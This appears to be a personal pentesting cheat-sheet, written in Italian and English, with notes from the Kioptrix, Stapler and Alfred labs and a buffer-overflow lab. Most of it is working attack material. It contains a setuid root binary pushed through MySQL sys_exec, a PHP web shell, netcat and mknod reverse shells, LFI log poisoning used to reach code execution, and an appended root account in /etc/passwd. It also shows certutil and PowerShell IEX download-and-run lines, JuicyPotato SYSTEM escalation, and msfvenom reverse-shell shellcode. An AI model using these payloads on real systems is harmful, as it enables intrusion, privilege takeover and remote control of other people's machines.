Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql&gt; select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.08 sec)
</pre></td></tr></tbody></table></code></div></div>

<p>Con questa vuln, si potrebbe anche pensare di fare uno compilato per settare i suid di root:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre></td><td class="rouge-code"><pre>john@Kioptrix4:~$ cd /tmp
john@Kioptrix4:/tmp$ cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
john@Kioptrix4:/tmp$ gcc -o setuid setuid.c
The program 'gcc' can be found in the following packages:
* gcc
* pentium-builder
Ask your administrator to install one of them
bash: gcc: command not found

root@kali:~# cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
root@kali:~# gcc -o setuid setuid.c -m32
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
172.16.119.135 - - [15/May/2015 08:28:52] "GET /setuid HTTP/1.0" 200 -

john@Kioptrix4:/tmp$ rm setuid.c
john@Kioptrix4:/tmp$ wget http://172.16.119.128:8000/setuid
--10:28:54--  http://172.16.119.128:8000/setuid
           =&gt; `setuid'
Connecting to 172.16.119.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5,072 (5.0K) [application/octet-stream]

100%[====================================&gt;] 5,072         --.--K/s            

10:28:54 (711.75 MB/s) - `setuid' saved [5072/5072]

john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2015-05-15 10:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-r--r--  1 john john 5072 2015-05-15 08:28 setuid
drwxr-xr-x  2 root root 4096 2015-05-15 08:35 .winbindd

john@Kioptrix4:/tmp$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql&gt; select sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid');
+-----------------------------------------------------------------+
| sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid') |
+-----------------------------------------------------------------+
| NULL                                                            |
+-----------------------------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; exit
Bye
john@Kioptrix4:/tmp$ ./setuid
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
</pre></td></tr></tbody></table></code></div></div>

<p><strong>you can inject php shell here</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ mysql&gt; Select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
</pre></td></tr></tbody></table></code></div></div>

<p>Trovato da un writeup (esegue reverse shell, utilizzando mknod inserendolo nel parametro cmd del file .php che ha caricato prima)
Browsing to the file, as with part 4, I did not get any feedback from running commands such as /phpmyadmin_shell.php?cmd=whoami however I was able to obtain a reverse shell connection using mknod:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>mknod /tmp/backpipe p; nc 192.168.110.129 8444 0/tmp/backpipe
</pre></td></tr></tbody></table></code></div></div>

<h3 id="lfi">LFI</h3>
<p>https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/</p>

<p>https://www.doyler.net/security-not-included/kioptrix-level-1-3-4-walkthrough</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>// Burp -&gt; target -&gt; site map -&gt; http://192.168.0.4 -&gt; checklogin.php -&gt; Right click: myusername=user&amp;mypassword=password -&gt; Send to repeater
// Burp -&gt; repeater -&gt; 2 -&gt; go                                          # Content-Length: 109. HTTP/1.1:200. (AKA Response doesn't have no phpsessid)
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; mypassword: ' or 1=1-- - -&gt;  go   # Content-Length: 429. HTTP/1.1:302. (AKA Response: cookie has a phpsessid value)
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; new -&gt; cookie -&gt; PHPSESSID:cec3a2499fb7067f170ccfaca1fb7980
// Burp -&gt; repeater -&gt; 2 -&gt; follow redirect -&gt; follow redirect -&gt; params -&gt; url -&gt; username: index.php -&gt; go
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; url -&gt; username: index.php%00 -&gt; go
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; url -&gt; username: /etc/passwd%00 -&gt; go
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; url -&gt; username: /etc/etc/passwd%00 -&gt; go
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; url -&gt; username: /proc/self/cmdline%00 -&gt; go
// Burp -&gt; (toolbar) repeater -&gt; action -&gt; sent to: intruder
// Burp -&gt; intruder -&gt; position -&gt; clear § -&gt; GET /member.php?username=/proc/self/fd/§id%00§ HTTP/1.1
// Burp -&gt; intruder -&gt; payload -&gt; numbers -&gt; from: 0 -&gt; to: 10 -&gt; Step: 1
// Burp -&gt; (toolbar) intruder -&gt; start attack
// Burp -&gt; response  # 9
// Burp -&gt; repeater -&gt; 2 -&gt; &lt; -&gt; &lt; -&gt; &lt; -&gt; &lt; -&gt; &lt; -&gt; &lt; -&gt; &lt; -&gt; remove: PHPSESSID -&gt; mypassword: ' or 1=1-- - &lt;?php phpinfo(); ?&gt; -&gt; go
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; new -&gt; cookie -&gt; PHPSESSID:9d64e60834f145250acc4ad08ca3eabc -&gt; go -&gt; follow redirct -&gt; follow redirct
// Firefox -&gt; http://192.168.0.4/member.php?username=/proc/self/fd/9%00
// Burp -&gt; repeater -&gt; 2 -&gt; &lt; -&gt; &lt; -&gt; &lt; -&gt; remove: PHPSESSID -&gt; mypassword: ' or 1=1-- &lt;?php echo "\n\n"; passthru($_GET['cmd']); ?&gt; -&gt; go
// Burp -&gt; repeater -&gt; 2 -&gt; params -&gt; new -&gt; cookie -&gt; PHPSESSID:a513efb8691a7f125a6c80af573eae25 -&gt; go -&gt; follow redirct -&gt; follow redirct
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&amp;cmd=id"
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&amp;cmd=whereis%20netcat"

nc -lvvp 443

curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&amp;cmd=/bin/nc.traditional%20192.168.0.192%20443%20-e%20/bin/sh"
</pre></td></tr></tbody></table></code></div></div>

<p>Spettacolo, praticamente usa il parametro username per leggere il contenuto di /etc/proc/fd/9 in cui viene loggato quello che inserisce l’utente al login. Quindi utilizza i log per fare una reverse shell</p>

<h3 id="tips--trick">Tips &amp; Trick</h3>
<ul>
  <li>
    <p>Al post del comando “ls” si può usare “echo *” per listare il contenuto di una cartella</p>
  </li>
  <li>
    <p>echo “root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash” » /etc/passwd</p>
  </li>
  <li>
    <p>Invertire un file <code class="language-plaintext highlighter-rouge">tac fsocity.dic &gt; fsocity.dic.reverse</code></p>
  </li>
</ul>

<h3 id="worpress">Worpress</h3>

<p>Let’s scan workpress
$ wpscan –disable-tls-checks –url https://192.168.190.131:12380/blogblog/ –enumerate u
$ wpscan –disable-tls-checks –url https://192.168.190.131:12380/blogblog/ –enumerate p
$ wpscan –url https://192.168.1.13:12380/blogblog/ –enumerate uap</p>

<h4 id="wordpress-advanced-video">wordpress advanced video</h4>

<p>searchsploit wordpress advanced video</p>

<p>$ cat /usr/share/exploitdb/platforms/php/webapps/39646.py</p>

<p>edit the script to the wordpress ip and folder 
then execute</p>

<p>then go to https://192.168.190.131:12380/blogblog/wp-content/uploads/
and download the image 520019578.jpeg</p>

<h4 id="change-shell">Change Shell</h4>
<p>then i changed the shell</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ sudo usermod -s /bin/bash peter
$ sudo -i
</pre></td></tr></tbody></table></code></div></div>

<p>Man <strong>usermod</strong>:
-s, –shell SHELL
    The name of the user’s new login shell. Setting this field to blank causes the system to select the default login shell.</p>

<p>Man <strong>sudo</strong>:
-i [command]
The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell’s -c option. If no command is specified, an interactive shell is executed. sudo attempts to change to that user’s home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.</p>

<h3 id="ssl-error-script-python-per-https">SSL error (script python, per https)</h3>

<p>Upon downloading the exploit, and running it, I was presented with an SSL error… So I went ahead and edited the code to include the following</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>import ssl
ssl._create_default_https_context = ssl._create_unverified_context
</pre></td></tr></tbody></table></code></div></div>

<p>vedi anche: https://github.com/gtech/39646/blob/master/39646.py</p>

<h3 id="recursive-cat">Recursive cat</h3>
<p>find -name “.bash_history” -exec cat {} \;</p>

<h3 id="linux-kernel-44x-ubuntu-1604--double-fdput-in-bpfbpf_prog_load-local-root-exploit-httpwwwmrb3ncomp81">Linux Kernel 4.4.x (Ubuntu 16.04) – double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit (http://www.mrb3n.com/?p=81)</h3>

<p>This particular kernel version appeared to be vulnerable to the following kernel exploit: https://www.exploit-db.com/exploits/39772/</p>

<h3 id="windows-exploits-alcuni">Windows Exploits (alcuni)</h3>

<p>https://github.com/WindowsExploits/Exploits</p>

<h3 id="certutil-windows---per-download">Certutil (Windows - per download)</h3>

<p>certutil -urlcache -split -f “http://$IP/$FILE” $NOME_FILE</p>

<h3 id="juicypotato">JuicyPotato</h3>
<p>Spiegazione presa da (https://www.youtube.com/watch?v=gz3_qRL0JJo)</p>

<p>Vedi anche: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato</p>

<p>https://github.com/ohpe/juicy-potato
https://github.com/ohpe/juicy-potato/releases</p>

<p>Prima si mette in ascolto la mia macchina (nc -lnvp 443), poi si fa l’upload di JuicyPotato.exe e di shell.bat sulla macchina vittima e poi si esegue sulla macchina vittima:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>JuicyPotato.exe -l 443 -p shell.bat -t *
</pre></td></tr></tbody></table></code></div></div>

<p>In shell.bat:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://$IP/shell.ps1'))"
</pre></td></tr></tbody></table></code></div></div>

<p>In shell.ps1: (è una reverse shell, presa da https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)</p>

<p>Oppure si può uploadare nc.exe e scrivere semplicemente in shell.ps1:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nc.exe -e cmd.exe $IP $PORT
</pre></td></tr></tbody></table></code></div></div>

<p>Volendo, se si volesse eseguire una command line (senza un file shell.bat), si può fare:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>JuicyPotato.exe -l 443 -p C:\Windows\system32\cmd.exe -t *
</pre></td></tr></tbody></table></code></div></div>

<p>Se dovesse dare errore, potrebbe ssere perchp si deve settare il CLSID (si prende dal link di JuicyPotato (con tutte le parentesi graffe), in base alla versione del sistema) e poi si setta:</p>

<p>L’errore è <strong>COM -&gt; recv failed with error: 10038</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>JuicyPotato.exe -l 443 -p shell.bat -t * -c  "$CLSID"
</pre></td></tr></tbody></table></code></div></div>

<p>C’è anche uno script powershell per trovare il CLSID https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
In questo link https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505 viene usato ma solo la prima parte!</p>

<ul>
  <li>Per questa vuln esiste anche PrintSpoofer https://github.com/itm4n/PrintSpoofer</li>
</ul>

<h4 id="esempio">Esempio</h4>

<p>Sulla mia macchina mi metto nel path <strong>~/Programs/JuicyPotato</strong> e avvio server python (così posso uploadare i file che mi servono sulla macchina vittima)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Programs/JuicyPotato]
└─$ sudo python -m SimpleHTTPServer 80
</pre></td></tr></tbody></table></code></div></div>

<p>Poi avvio anche un listener (che mi servirà quando eseguo JuicyPotato):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nc -lnvp 4444
</pre></td></tr></tbody></table></code></div></div>

<p>N.B. 
	- Nello script <strong>shell.bat</strong> bisogna modificare IP e PORT che devono essere quelli del server python
	- Nello script <strong>shell.ps1</strong> nell’ultima riga bisogna modificare IP e PORT perchè è questo che crea la reverse shell</p>

<p>Macchina vittima:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
</pre></td><td class="rouge-code"><pre>PS C:\Users\bruce&gt; certutil -urlcache -split -f "http://10.8.80.159/JuicyPotato.exe" jp.exe

****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce&gt; PS C:\Users\bruce&gt; certutil -urlcache -split -f "http://10.8.80.159/shell.bat" shell.bat
****  Online  ****
  0000  ...
  0065
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce&gt; certutil -urlcache -split -f "http://10.8.80.159/shell.ps1" shell.ps1
****  Online  ****
  0000  ...
  1128
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce&gt; dir


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            
-a---          6/2/2021   3:28 PM     347648 jp.exe                            
-a---          6/2/2021   3:29 PM        101 shell.bat                         
-a---          6/2/2021   3:29 PM       4392 shell.ps1                         


PS C:\Users\bruce&gt; .\jp.exe -l 4444 -p shell.bat -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
COM -&gt; recv failed with error: 10038
PS C:\Users\bruce&gt; systeminfo

Host Name:                 ALFRED
OS Name:                   Microsoft Windows 7 Ultimate 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          bruce
Registered Organization:   
Product ID:                00426-OEM-9154295-64842
Original Install Date:     10/25/2019, 9:51:08 PM
System Boot Time:          6/2/2021, 3:22:00 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,184 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,107 MB
Virtual Memory: In Use:    988 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.107.63
                                 [02]: fe80::29a7:2281:ed40:a2b9

PS C:\Users\bruce&gt; .\jp.exe -l 4444 -p shell.bat -t * -c "{555F3418-D99E-4E51-800A-6E89CFD8B1D7}"
Testing {555F3418-D99E-4E51-800A-6E89CFD8B1D7} 4444
......
[+] authresult 0
{555F3418-D99E-4E51-800A-6E89CFD8B1D7};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
</pre></td></tr></tbody></table></code></div></div>

<p>Se voglio eseguire lo script per trovare i CLSID, ho una versione semplificata rispetto a quella che si trova sul github di JuicyPotato
Il file si trova in <strong>~/Programs/JuicyPotato/getCLSID_semplificato.ps1</strong></p>

<p>Dalla macchina vittima:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>PS C:\Users\bruce&gt; certutil -urlcache -split -f "http://10.8.80.159/getCLSID_semplificato.ps1" getCLSID.ps1
****  Online  ****
  0000  ...
  011c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce&gt; .\getCLSID.ps1

WARNING: column "CurrentLocation" does not fit into the display and was removed
.

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
{00021401-0000-0000-C000-000000000046}
{000C101C-0000-0000-C000-000000000046}
{0010890e-8789-413c-adbc-48f5b511b3af}
{00393519-3A67-4507-A2B8-85146167ACA7}
{00597829-82CE-44d4-8B0B-40BE695973B5}
{00BC7EAE-28D5-4310-BE9F-11526A7FA37F}
{00f2b433-44e4-4d88-b2b0-2698a0a91dba}
{010911E2-F61C-479B-B08C-43E6D1299EFE}
{0289a7c5-91bf-4547-81ae-fec91a89dec5}
{031EE060-67BC-460d-8847-E4A7C5E45A27}
{0365BE92-BD3F-47f5-8BB6-2EEF7AF5CAE7}
{03837511-098B-11D8-9414-505054503030}

[...]
</pre></td></tr></tbody></table></code></div></div>

<p>Per questo script, ho avuto un errore:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>PS C:\Users\bruce&gt; .\getCLSID.ps1
****  Online  ****
  0000  ...
  062c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce&gt; Invoke-PowerShellTcp : File C:\Users\bruce\getCLSID.ps1 cannot be loaded becaus
e the execution of scripts is disabled on this system. Please see "get-help abo
ut_signing" for more details.
At line:1 char:119
+ iex (New-Object Net.WebClient).DownloadString('http://10.8.80.159:8000/Invoke
-PowerShellTcp.ps1');Invoke-PowerShellTcp &lt;&lt;&lt;&lt;  -Reverse -IPAddress 10.8.80.159
 -Port 5555
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
</pre></td></tr></tbody></table></code></div></div>

<p>Ho risolto eseguendo il comando <code class="language-plaintext highlighter-rouge">Set-ExecutionPolicy RemoteSigned</code> da <strong>ADMIN</strong> (ovviamente dopo aver eseguito JuicyPotato, ma era per testare lo script). Quindi se dovesse dare questo errore, serve essere admin.</p>

<h3 id="printspoofer">PrintSpoofer</h3>
<p>Per vulnerabilità di SeImpersonatePrivileges</p>

<p>https://github.com/itm4n/PrintSpoofer</p>

<h3 id="sqli">SQLi</h3>

<p>https://book.hacktricks.xyz/pentesting-web/sql-injection</p>

<p>###BoF</p>

<h5 id="windows">Windows</h5>
<ol>
  <li>Cambiare IP e PORT in fuzzer.py</li>
  <li>
    <p>Eseguire fuzzer.py per trovare il numero di bytes per far crashare l’applicativo</p>
  </li>
  <li>
    <p>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l #bytes_trovati_al_punto_2 + 500</p>
  </li>
  <li>Resettare in exploit.py i valori di: (Cambiare anche IP e PORT)
    <ul>
      <li>buffer_size = 0</li>
      <li>offset = 0</li>
      <li>overflow = “A” * offset</li>
      <li>retn = “”</li>
      <li>nop_size = 0</li>
      <li>padding = “” * nop_size</li>
      <li>payload = “”</li>
    </ul>
  </li>
  <li>
    <p>Inserire il valore trovato al punto 2 in <strong>buffer_size</strong> e la stringa generata al punto 3 in <strong>payload</strong></p>
  </li>
  <li>Nella macchina Windows avviare Immunity Debugger con l’applicativo ed eseguire:
    <ul>
      <li>!mona config -set workingfolder c:\mona\%p</li>
    </ul>
  </li>
  <li>
    <p>Eseguire exploit.py</p>
  </li>
  <li>Andare nella macchina Windows e l’applicativo ha crashato, eseguire:
    <ul>
      <li>!mona findmsp -distance #bytes_trovati_al_punto_2 + 500</li>
    </ul>
  </li>
</ol>

<p>Questo ci darà il valore dell’offset. <strong>N.B prendere offset scritto nella riga dell’EIP</strong></p>

<ol>
  <li>
    <p>Sostituire il valore dell’offset trovato al punto 8, in exploit.py alla variabile <strong>offset</strong> (LOL, ovviamente xD)</p>
  </li>
  <li>
    <p>Inserire “BBBB” in exploit.py nella variabile <strong>retn</strong> (commentare la riga di codice <code class="language-plaintext highlighter-rouge">buffer += struct.pack('&lt;I', retn)</code> e inserire <code class="language-plaintext highlighter-rouge">buffer += retn</code> altrimenti dà errore)
Questo per testare che effettivamente viene inserito “BBBB” nel return address con l’offset che abbiamo inserito.</p>
  </li>
  <li>Trovare i bad character</li>
  <li>Creare un array di byte su immunity debugger <code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00"</code></li>
  <li>
    <p>Exeguire generate_bad_chars.py e copiare il payload in exploit.py ed eseguirlo</p>
  </li>
  <li>Andare su immunity debugger ed eseguire <code class="language-plaintext highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a addr_esp</code> (attenta al path) e sostituire l’indirizzo dell’esp</li>
  <li>
    <p>Se ci sono bad characters rifare il giro dal punto 12 aggiungendo i caratteri</p>
  </li>
  <li>Una volta trovati i bad characters <code class="language-plaintext highlighter-rouge">!mona jmp -r esp -cpb "\x00\x08\x2c\xad"</code> (sostituire nelle virgolette, i bad characters trovati prima)</li>
  <li>
    <p>Prendere uno degli indirizzi che escono dal punto 16 e inserirlo in exploit.py in retn (esattamente così 0x311712f3) (rimettere la riga di codice <code class="language-plaintext highlighter-rouge">buffer += struct.pack('&lt;I', retn)</code>)</p>
  </li>
  <li>
    <p>Generare shellcode <code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.159 LPORT=5555 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py -v payload</code> (dipende che sistema si ha)</p>
  </li>
  <li>Inserire il payload in exploit.py in questo formato:
payload = (“\xba\x13\x24\xb9\x47\xda\xc3\xd9\x74\x24\xf4\x5e”
“\x2b\xc9\xb1\x12\x83\xc6\x04\x31\x56\x0e\x03\x45”
“\x2a\x5b\xb2\x58\xe9\x6c\xde\xc9\x4e\xc0\x4b\xef”
“\xd9\x07\x3b\x89\x14\x47\xaf\x0c\x17\x77\x1d\x2e”
“\x1e\xf1\x64\x46\x61\xa9\x96\xeb\x09\xa8\x98\x06”
“\x79\x25\x79\x98\x1b\x66\x2b\x8b\x50\x85\x42\xca”
“\x5a\x0a\x06\x64\x0b\x24\xd4\x1c\xbb\x15\x35\xbe”
“\x52\xe3\xaa\x6c\xf6\x7a\xcd\x20\xf3\xb1\x8e”)</li>
</ol>

<p>Aggiungere anche:
nop_size = 20
padding = “\x90” * nop_size</p>

<ol>
  <li>Mettere in listening ed eseguire exploit.py</li>
</ol>

<h5 id="linux">Linux</h5>

<ol>
  <li>Trovare la lunghezza di stringa che fa crashare l’applicativo, per generare si può eseguire da gdb:
<code class="language-plaintext highlighter-rouge">run $(python -c "print('A'*100)")</code></li>
</ol>

<p>Aumentando fino a che non crasha</p>

<ol>
  <li>Trovata la lunghezza (in questo caso 200), generare il payload:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Rieseguire l’applicativo con la stringa generata al punto 2:
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</li>
</ol>

<p>Program received signal SIGSEGV, Segmentation fault.
0x39644138 in ?? ()</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>
4. Per trovare l'offset, si prende l'indirizzo di memoria che dà gdb quando l'applicativo crasha:
</pre></td></tr></tbody></table></code></div></div>
<p>└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138 
[*] Exact match at offset 116</p>
